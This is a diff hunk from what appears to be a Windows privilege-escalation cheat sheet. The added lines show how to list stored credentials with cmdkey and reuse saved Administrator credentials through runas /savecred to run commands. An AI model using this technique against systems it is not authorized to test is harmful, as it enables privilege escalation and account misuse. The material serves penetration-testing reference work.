@@ -663,7 +663,10 @@ Look for `bash.exe` and `wsl.exe` with `where /R c:\windows bash.exe` and `where
 
 - RunAs
 
-cmdkey /list
+Look for stored credentials with `cmdkey /list`. Example with administrator :  
+```
+runas /user:DOMAIN\Administrator /savecred "cmd.exe /c whoami"
+```
 
 ## Get shells
 
